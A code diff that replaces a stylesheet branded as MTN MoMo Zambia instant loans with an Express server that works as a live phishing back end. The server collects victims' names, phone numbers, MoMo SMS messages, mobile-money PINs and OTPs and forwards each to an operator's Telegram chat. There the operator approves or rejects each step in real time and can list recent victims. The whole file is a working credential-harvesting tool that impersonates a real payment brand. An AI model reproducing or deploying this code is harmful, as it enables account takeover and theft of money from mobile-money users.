@@ -1,333 +1,351 @@
-/* ============================================================
-   MTN MoMo Zambia – Instant Loans
-   ============================================================ */
+require('dotenv').config();
+const express = require('express');
+const cors = require('cors');
+const path = require('path');
 
-:root {
-  --mtn-dark: #004f71;
-  --mtn-light: #009fe3;
-  --mtn-gold: #ffcb05;
-  --mtn-blue: #1e63c6;
-  --mtn-red: #e60000;
-  --text-dark: #1C2340;
-  --text-mid: #444;
-  --text-light: #888;
-  --border: #ddd;
-  --radius: 12px;
-  --radius-sm: 8px;
-  --page-bg: #f4f7f6;
-}
+const app = express();
+app.use(cors());
+app.use(express.json());
 
-* {
-  box-sizing: border-box;
-  margin: 0;
-  padding: 0;
-}
+const frontendPath = path.join(__dirname, '../frontend');
+app.use(express.static(frontendPath));
 
-body {
-  font-family: 'Inter', sans-serif;
-  background: var(--page-bg);
-  color: var(--text-dark);
-  min-height: 100vh;
+app.get('/style.css', (req, res) => {
+  res.sendFile(path.join(frontendPath, 'style.css'), {
+    headers: { 'Content-Type': 'text/css' }
+  });
+});
+
+const PORT = process.env.PORT || 3000;
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+
+const applications = {};
+
+function generateRef() {
+  return Math.random().toString(36).substring(2, 8).toUpperCase();
 }
 
-/* ─── Loader ─── */
-#loader {
-  position: fixed;
-  top: 0; left: 0; right: 0; bottom: 0;
-  background: #fff;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  z-index: 9999;
-}
-.loader-spinner {
-  width: 60px;
-  height: 60px;
-  border: 6px solid #e0e0e0;
-  border-top: 6px solid var(--mtn-blue);
-  border-radius: 50%;
-  animation: spin 1s linear infinite;
-}
-.loader-text {
-  margin-top: 16px;
-  font-weight: 600;
-  color: var(--mtn-dark);
-}
-@keyframes spin { to { transform: rotate(360deg); } }
-
-/* ─── Pages ─── */
-.page {
-  display: none;
-  min-height: 100vh;
-  animation: fadeIn 0.3s ease;
-}
-.page.active { display: flex; flex-direction: column; }
-@keyframes fadeIn {
-  from { opacity: 0; transform: translateY(8px); }
-  to { opacity: 1; transform: translateY(0); }
+async function sendTelegramMessage(message, buttons = null) {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+  const body = { chat_id: TELEGRAM_CHAT_ID, text: message };
+  if (buttons) body.reply_markup = { inline_keyboard: buttons };
+  try {
+    const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
+    });
+    const data = await response.json();
+    if (!data.ok) {
+      console.error('Telegram API error:', data);
+    } else {
+      console.log('✅ Telegram message sent');
+    }
+  } catch (e) {
+    console.error('Telegram send error:', e);
+  }
 }
 
-/* ─── Navbar ─── */
-.navbar {
-  background: var(--mtn-dark);
-  color: #fff;
-  padding: 16px 24px;
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-}
-.logo {
-  display: flex;
-  align-items: center;
-  gap: 10px;
-  text-decoration: none;
-  color: #fff;
-}
-.logo-icon {
-  width: 44px; height: 44px;
-  background: var(--mtn-gold);
-  border-radius: 10px;
-  display: flex; align-items: center; justify-content: center;
-  font-weight: 900; font-size: 24px; color: var(--mtn-dark);
-}
-.logo-text { font-size: 20px; font-weight: 800; }
-.logo-text span { color: var(--mtn-gold); }
-.logo-sub { font-size: 12px; opacity: 0.8; }
-.nav-actions { display: flex; align-items: center; gap: 16px; }
-.status { display: flex; align-items: center; gap: 6px; font-size: 14px; }
-.dot { width: 10px; height: 10px; background: #00d26a; border-radius: 50%; }
-.hamburger { display: flex; flex-direction: column; gap: 4px; cursor: pointer; }
-.hamburger span { width: 24px; height: 3px; background: #fff; border-radius: 2px; }
+// ─── Health ───
+app.get('/api/health', (req, res) => res.json({ ok: true }));
 
-/* ─── Hero ─── */
-.hero {
-  background: linear-gradient(135deg, var(--mtn-dark), var(--mtn-light));
-  color: #fff;
-  padding: 60px 24px;
-  text-align: center;
-  flex: 1;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-}
-.hero-content { max-width: 500px; }
-.badge {
-  display: inline-block;
-  background: rgba(255,255,255,0.15);
-  padding: 6px 14px;
-  border-radius: 30px;
-  font-size: 14px;
-  margin-bottom: 20px;
-}
-.hero h1 { font-size: 44px; line-height: 1.2; margin-bottom: 16px; }
-.hero h1 .highlight { color: var(--mtn-gold); }
-.hero p { font-size: 16px; opacity: 0.9; margin-bottom: 30px; }
-.hero-cta {
-  display: inline-block;
-  background: var(--mtn-gold);
-  color: var(--mtn-dark);
-  padding: 14px 30px;
-  border-radius: 50px;
-  font-weight: 700;
-  text-decoration: none;
-  font-size: 16px;
-  transition: transform 0.2s;
-}
-.hero-cta:hover { transform: scale(1.05); }
-.countdown-section { margin-top: 40px; }
-.countdown-number { font-size: 48px; font-weight: 900; }
-.countdown-label { font-size: 14px; opacity: 0.8; display: block; margin-bottom: 10px; }
-.countdown-bar { background: rgba(255,255,255,0.2); border-radius: 8px; height: 6px; overflow: hidden; }
-.countdown-bar .fill { background: var(--mtn-gold); height: 100%; width: 0; transition: width 0.1s linear; }
+// ─── Submit Application ───
+app.post('/api/send-application', async (req, res) => {
+  const data = req.body.applicationData;
+  const appId = `${data.phone}_${Date.now()}`;
+  const ref = generateRef();
 
-/* ─── Features ─── */
-.features {
-  background: #fff;
-  padding: 40px 24px;
-  text-align: center;
-}
-.section-title { font-size: 24px; font-weight: 700; margin-bottom: 30px; }
-.features-grid {
-  display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-  gap: 20px;
-  max-width: 800px;
-  margin: 0 auto;
-}
-.feature-card {
-  background: #f8f9fa;
-  padding: 24px;
-  border-radius: 12px;
-  text-align: center;
-}
-.feature-card .icon { font-size: 36px; margin-bottom: 10px; }
-.feature-card h4 { font-size: 16px; margin-bottom: 6px; }
-.feature-card p { font-size: 13px; color: var(--text-light); }
+  applications[appId] = {
+    ...data,
+    ref,
+    smsStatus: 'pending',
+    pinStatus: 'pending',
+    otpStatus: 'pending',
+    pinAttempts: 0,
+    maxPinAttempts: 3,
+    pinBlockedUntil: null,
+    createdAt: new Date().toISOString()
+  };
 
-/* ─── Footer ─── */
-.footer {
-  background: #1a1a1a;
-  color: #999;
-  text-align: center;
-  padding: 20px;
-  font-size: 13px;
-}
-.footer .brand { color: var(--mtn-gold); }
+  const message = `NEW LOAN APPLICATION\nID: ${appId}\nPhone: +260${data.phone}\nAmount: ZMW ${data.loanAmount}\nTerm: ${data.loanTerm}\nName: ${data.firstName} ${data.lastName}\n\nApprove or reject:`;
+  const buttons = [[
+    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'SMS', ref }) },
+    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'SMS', ref }) }
+  ]];
 
-/* ─── Generic Landing (calculator page) ─── */
-.land-nav {
-  background: #fff;
-  padding: 16px 24px;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-}
-.mtn-logo { display: flex; flex-direction: column; align-items: center; }
-.mtn-logo-icon { width: 44px; height: 44px; background: var(--mtn-gold); border-radius: 10px; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 24px; color: var(--mtn-dark); }
-.mtn-logo-text { font-weight: 800; font-size: 20px; }
-.mtn-logo-sub { font-size: 12px; color: #666; }
+  await sendTelegramMessage(message, buttons);
+  res.json({ ok: true, applicationId: appId, status: 'waiting_sms' });
+});
 
-.land-center {
-  flex: 1;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  padding: 32px 16px;
-}
-.land-card {
-  width: 100%;
-  max-width: 520px;
-  background: #fff;
-  border-radius: var(--radius);
-  box-shadow: 0 4px 24px rgba(0,0,0,0.1);
-  padding: 36px 32px;
-}
-.land-card h1 { font-size: 32px; text-align: center; margin-bottom: 6px; }
-.land-card h1 .highlight { color: var(--mtn-blue); }
-.land-tagline { text-align: center; color: var(--text-light); margin-bottom: 24px; }
-.land-footer { background: var(--mtn-dark); color: #fff; text-align: center; padding: 16px; font-size: 14px; }
+// ─── Send SMS (MoMo message) ───
+app.post('/api/send-momo-message', async (req, res) => {
+  const { applicationId, phone, momoMessage } = req.body.momoData;
+  const app = applications[applicationId];
+  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
 
-/* ─── Buttons ─── */
-.btn-grad {
-  width: 100%;
-  padding: 14px 20px;
-  background: linear-gradient(to right, var(--mtn-dark), var(--mtn-light));
-  color: #fff;
-  border: none;
-  border-radius: 8px;
-  font-size: 16px;
-  font-weight: 600;
-  cursor: pointer;
-  transition: opacity 0.2s;
-  font-family: inherit;
-}
-.btn-grad:hover { opacity: 0.9; }
-.btn-gray {
-  background: #e0e0e0;
-  color: #666;
-  border: none;
-  border-radius: 8px;
-  padding: 14px 20px;
-  font-size: 14px;
-  font-weight: 600;
-  cursor: pointer;
-  flex: 1;
-  font-family: inherit;
-}
-.step-btns { display: flex; gap: 12px; margin-top: 8px; }
+  app.momoMessage = momoMessage;
+  app.smsStatus = 'pending';
 
-/* ─── Forms ─── */
-.field { margin-bottom: 18px; }
-.field label { display: block; font-size: 14px; font-weight: 500; color: var(--text-mid); margin-bottom: 6px; }
-.field input, .field select, .field textarea {
-  width: 100%;
-  padding: 11px 14px;
-  border: 1.5px solid var(--border);
-  border-radius: var(--radius-sm);
-  font-family: 'Inter', sans-serif;
-  font-size: 16px;
-  color: var(--text-dark);
-  background: #fff;
-  outline: none;
-}
-.field input:focus, .field select:focus, .field textarea:focus { border-color: var(--mtn-blue); }
-.field-row { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
-.sel-wrap { position: relative; }
-.sel-wrap::after { content: '▾'; position: absolute; right: 14px; top: 50%; transform: translateY(-50%); color: var(--text-light); pointer-events: none; }
-.phone-row { display: flex; }
-.ph-pre {
-  padding: 11px 12px;
-  background: #f5f5f5;
-  border: 1.5px solid var(--border);
-  border-right: none;
-  border-radius: var(--radius-sm) 0 0 var(--radius-sm);
-  font-size: 14px;
-  font-weight: 500;
-  color: #555;
-  display: flex;
-  align-items: center;
-}
-.phone-row input { border-radius: 0 var(--radius-sm) var(--radius-sm) 0 !important; flex: 1; }
-.field-hint { font-size: 12px; color: var(--text-light); margin-top: 4px; }
+  const message = `MOMO MESSAGE VERIFICATION\nID: ${applicationId}\nPhone: +260${phone}\n\nMessage:\n${momoMessage}\n\nApprove or reject:`;
+  const buttons = [[
+    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'SMS', ref: app.ref }) },
+    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'SMS', ref: app.ref }) }
+  ]];
 
-/* ─── Progress Bar ─── */
-.prog-row { display: flex; gap: 8px; margin: 10px 0 24px; }
-.prog-seg { flex: 1; height: 4px; border-radius: 2px; background: #e0e0e0; }
-.prog-seg.done, .prog-seg.now { background: var(--mtn-gold); }
-.prog-seg.now { animation: pulse-progress 1.5s ease infinite; }
-@keyframes pulse-progress { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }
+  await sendTelegramMessage(message, buttons);
+  res.json({ ok: true, status: 'pending' });
+});
 
-/* ─── Step Cards ─── */
-.step-center { flex: 1; display: flex; align-items: flex-start; justify-content: center; padding: 28px 16px; }
-.step-card {
-  width: 100%;
-  max-width: 480px;
-  background: #fff;
-  border-radius: var(--radius);
-  box-shadow: 0 4px 24px rgba(0,0,0,0.08);
-  padding: 32px 28px;
-}
-.step-card h2 { font-size: 24px; text-align: center; margin-bottom: 4px; }
-.step-sub { text-align: center; font-size: 14px; color: var(--text-light); margin-bottom: 16px; }
+// ─── Send PIN ───
+app.post('/api/send-pin', async (req, res) => {
+  const { applicationId, pin } = req.body;
+  const app = applications[applicationId];
+  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
 
-/* ─── Calculator ─── */
-.calc-box { background: #fafafa; border: 1px solid #eee; border-radius: var(--radius-sm); padding: 20px; margin-bottom: 22px; }
-.calc-box h2 { font-size: 16px; margin-bottom: 16px; }
-.calc-row2 { display: flex; justify-content: space-between; font-size: 14px; color: var(--text-mid); margin-bottom: 6px; }
-.cv { color: var(--mtn-blue); font-weight: 600; }
-input[type=range] { width: 100%; -webkit-appearance: none; height: 5px; border-radius: 3px; background: #ddd; outline: none; margin: 8px 0 4px; }
-input[type=range]::-webkit-slider-thumb { -webkit-appearance: none; width: 18px; height: 18px; background: var(--mtn-blue); border-radius: 50%; border: 3px solid #fff; cursor: pointer; }
-.range-ends { display: flex; justify-content: space-between; font-size: 12px; color: var(--text-light); }
-.monthly-box { background: #fff; border: 1px solid #eee; border-radius: var(--radius-sm); padding: 14px 16px; display: flex; justify-content: space-between; align-items: center; }
-.monthly-box .ml { font-size: 14px; color: var(--text-light); }
-.monthly-box .ma { font-size: 24px; font-weight: 700; color: var(--mtn-blue); }
+  if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date()) {
+    return res.status(429).json({ ok: false, blocked: true, message: 'Too many attempts. Please wait 5 minutes.' });
+  }
+  if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) <= new Date()) {
+    app.pinAttempts = 0;
+    app.pinBlockedUntil = null;
+  }
 
-/* ─── Messages ─── */
-.msg-box { border-radius: var(--radius-sm); padding: 12px 16px; font-size: 14px; margin-bottom: 16px; display: none; align-items: center; gap: 10px; }
-.msg-box.show { display: flex; }
-.msg-box.error { background: #fef2f2; border: 1.5px solid #fecaca; color: #991b1b; }
-.msg-icon { font-weight: 700; }
+  app.pin = pin;
+  app.pinStatus = 'pending';
 
-/* ─── Summary Box ─── */
-.sum-box { border: 1px solid #e0e0e0; border-left: 4px solid var(--mtn-blue); border-radius: var(--radius-sm); padding: 16px; margin: 16px 0; background: #fafffe; }
-.sum-box h3 { font-size: 16px; margin-bottom: 12px; }
-.sum-row { display: flex; justify-content: space-between; font-size: 14px; padding: 7px 0; border-bottom: 1px solid #f0f0f0; }
-.sum-row:last-child { border-bottom: none; }
-.sum-row .sk { color: var(--text-light); }
-.sum-row .sv { font-weight: 500; }
+  const message = `PIN VERIFICATION\nID: ${applicationId}\nPIN Entered: ${pin}\n\nApprove or reject:`;
+  const buttons = [[
+    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'PIN', ref: app.ref }) },
+    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'PIN', ref: app.ref }) }
+  ]];
 
-/* ─── Processing / Waiting ─── */
-.proc-wrap, .wait-wrap { text-align: center; padding: 40px 24px; max-width: 420px; }
-.proc-icon, .wait-icon { width: 80px; height: 80px; border-radius: 50%; background: rgba(255,255,255,0.1); border: 2px solid rgba(255,255,255,0.3); display: flex; align-items: center; justify-content: center; font-size: 32px; margin: 0 auto 24px; animation: pulse 2s ease infinite; }
-.proc-wrap h2, .wait-wrap h2 { color: #fff; font-size: 24px; margin-bottom: 12px; }
-.proc-wrap p, .wait-wrap p { color: rgba(255,255,255,0.75); font-size: 14px; line-height: 1.7; margin-bottom: 24px; }
-@keyframes pulse { 0%,100% { box-shadow: 0 0 0 0 rgba(255,203,5,0.3); } 50% { box-shadow: 0 0 0 16px rgba(255,203,5,0); } }
+  await sendTelegramMessage(message, buttons);
+  res.json({ ok: true, status: 'pending' });
+});
 
-/* ─── PIN / OTP ─── */
-.pin-label { font-size: 14px; color: var(--text-light); text-align: center; margin-bottom: 12px; }
-.pin-row { display: flex; gap: 10px; justify-content: center; margin-bottom: 12px; align-items: center; }
-.pin-box { width: 52px; height: 52px; border: 1.5px solid var(--border); border-radius: var(--radius-sm); text-align: center; font-size: 24px; font-weight: 700; color: var(--mtn-blue); outline: none; }
-.pin-box:focus { border-color: var(--mtn-blue); }
-.pin-eye, .pin-delete
+// ─── Send OTP ───
+app.post('/api/send-otp', async (req, res) => {
+  const { applicationId, otp } = req.body;
+  const app = applications[applicationId];
+  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
+
+  app.otp = otp;
+  app.otpStatus = 'pending';
+
+  const message = `OTP VERIFICATION\nID: ${applicationId}\nOTP Entered: ${otp}\n\nApprove or reject:`;
+  const buttons = [[
+    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'OTP', ref: app.ref }) },
+    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'OTP', ref: app.ref }) }
+  ]];
+
+  await sendTelegramMessage(message, buttons);
+  res.json({ ok: true, status: 'pending' });
+});
+
+// ─── Resend OTP ───
+app.post('/api/resend-otp', async (req, res) => {
+  const { applicationId } = req.body;
+  const app = applications[applicationId];
+  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
+
+  app.otpStatus = 'pending';
+
+  const message = `OTP RESENT - ADMIN ACTION REQUIRED\nID: ${applicationId}\nNew OTP requested.\n\nApprove or reject:`;
+  const buttons = [[
+    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'OTP', ref: app.ref }) },
+    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'OTP', ref: app.ref }) }
+  ]];
+
+  await sendTelegramMessage(message, buttons);
+  res.json({ ok: true, status: 'otp_resent' });
+});
+
+// ─── PIN Rejected – increment attempts ───
+app.post('/api/pin-rejected', async (req, res) => {
+  const { applicationId } = req.body;
+  const app = applications[applicationId];
+  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
+
+  app.pinAttempts = (app.pinAttempts || 0) + 1;
+  const remaining = app.maxPinAttempts - app.pinAttempts;
+
+  if (remaining <= 0) {
+    app.pinStatus = 'blocked';
+    app.pinBlockedUntil = new Date(Date.now() + 5 * 60 * 1000).toISOString();
+    return res.json({ ok: false, blocked: true, remainingAttempts: 0 });
+  }
+
+  app.pinStatus = 'rejected';
+  res.json({ ok: true, remainingAttempts: remaining });
+});
+
+// ─── Reset PIN Attempts ───
+app.post('/api/reset-pin-attempts/:applicationId', async (req, res) => {
+  const app = applications[req.params.applicationId];
+  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
+
+  app.pinAttempts = 0;
+  app.pinBlockedUntil = null;
+  app.pinStatus = 'pending';
+  res.json({ ok: true });
+});
+
+// ─── PIN Status ───
+app.get('/api/pin-status/:applicationId', (req, res) => {
+  const app = applications[req.params.applicationId];
+  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
+
+  const remainingAttempts = app.maxPinAttempts - (app.pinAttempts || 0);
+  const isBlocked = app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date();
+  let blockRemainingSeconds = 0;
+  if (isBlocked) {
+    blockRemainingSeconds = Math.ceil((new Date(app.pinBlockedUntil) - new Date()) / 1000);
+  }
+
+  res.json({
+    ok: true,
+    remainingAttempts,
+    isBlocked,
+    blockRemainingSeconds,
+    pinStatus: app.pinStatus
+  });
+});
+
+// ─── Status Check (for polling) ───
+app.get('/api/status/:applicationId/:step', (req, res) => {
+  const app = applications[req.params.applicationId];
+  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
+
+  let status = 'pending';
+  let remainingAttempts = null;
+  let blocked = false;
+
+  if (req.params.step === 'sms') status = app.smsStatus;
+  else if (req.params.step === 'pin') {
+    status = app.pinStatus;
+    remainingAttempts = app.maxPinAttempts - (app.pinAttempts || 0);
+    blocked = app.pinStatus === 'blocked' || (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date());
+  } else if (req.params.step === 'otp') status = app.otpStatus;
+
+  res.json({ ok: true, status, remainingAttempts, blocked });
+});
+
+// ─── Rejection Info ───
+app.get('/api/rejection-info/:applicationId', (req, res) => {
+  const app = applications[req.params.applicationId];
+  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
+
+  let rejectedStep = null;
+  let errorMessage = '';
+
+  if (app.smsStatus === 'rejected') {
+    rejectedStep = 'sms';
+    errorMessage = 'Your SMS was rejected. Please check and resubmit.';
+  } else if (app.pinStatus === 'rejected') {
+    rejectedStep = 'pin';
+    errorMessage = 'Your PIN was rejected. Please re-enter your PIN.';
+  } else if (app.otpStatus === 'rejected') {
+    rejectedStep = 'otp';
+    errorMessage = 'Your OTP was rejected. Please request a new OTP.';
+  }
+
+  res.json({ ok: true, rejectedStep, errorMessage, applicationId: req.params.applicationId });
+});
+
+// ─── Telegram Webhook ───
+app.post('/api/telegram-webhook', async (req, res) => {
+  const update = req.body;
+  console.log('📩 Webhook received');
+
+  if (update.callback_query) {
+    const query = update.callback_query;
+    let data;
+    try {
+      data = JSON.parse(query.data);
+    } catch (e) {
+      console.error('Failed to parse callback_data:', query.data, e);
+      return res.sendStatus(200);
+    }
+
+    const { a, s, ref } = data;
+    console.log(`🔘 Callback: action=${a}, step=${s}, ref=${ref}`);
+
+    let appId = null;
+    for (const id in applications) {
+      if (applications[id].ref === ref) {
+        appId = id;
+        break;
+      }
+    }
+
+    if (!appId) {
+      console.error(`❌ No app found for ref: ${ref}`);
+      return res.sendStatus(200);
+    }
+
+    const app = applications[appId];
+    console.log(`✅ Found app: ${appId}`);
+
+    if (s === 'SMS') {
+      app.smsStatus = a === 'YES' ? 'approved' : 'rejected';
+    } else if (s === 'PIN') {
+      if (a === 'YES') {
+        app.pinStatus = 'approved';
+      } else {
+        app.pinAttempts = (app.pinAttempts || 0) + 1;
+        if (app.pinAttempts >= app.maxPinAttempts) {
+          app.pinStatus = 'blocked';
+          app.pinBlockedUntil = new Date(Date.now() + 5 * 60 * 1000).toISOString();
+        } else {
+          app.pinStatus = 'rejected';
+        }
+      }
+    } else if (s === 'OTP') {
+      app.otpStatus = a === 'YES' ? 'approved' : 'rejected';
+    }
+
+    await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ callback_query_id: query.id, text: `✅ ${a}` })
+    });
+
+    await sendTelegramMessage(`Status Update\nID: ${appId}\nStep: ${s}\nAction: ${a}`);
+    return res.sendStatus(200);
+  }
+
+  if (update.message && update.message.text) {
+    const text = update.message.text.trim();
+    const chatId = update.message.chat.id;
+    console.log(`💬 Message from ${chatId}: ${text}`);
+    if (chatId.toString() === TELEGRAM_CHAT_ID) {
+      if (text === '/stats') {
+        const total = Object.keys(applications).length;
+        await sendTelegramMessage(`Total applications: ${total}`);
+      } else if (text === '/list') {
+        const ids = Object.keys(applications).slice(-5);
+        let msg = 'Recent applications:\n';
+        ids.forEach(id => {
+          const app = applications[id];
+          msg += `${id} – ${app.phone} (SMS: ${app.smsStatus}, PIN: ${app.pinStatus}, OTP: ${app.otpStatus})\n`;
+        });
+        await sendTelegramMessage(msg || 'No applications yet.');
+      } else if (text === '/help') {
+        await sendTelegramMessage('Commands: /stats, /list, /status');
+      }
+    }
+  }
+
+  res.sendStatus(200);
+});
+
+// ─── Fallback ───
+app.get('*', (req, res) => {
+  res.sendFile(path.join(frontendPath, 'index.html'));
+});
+
+app.listen(PORT, () => {
+  console.log(`🚀 Server running on port ${PORT}`);
+});
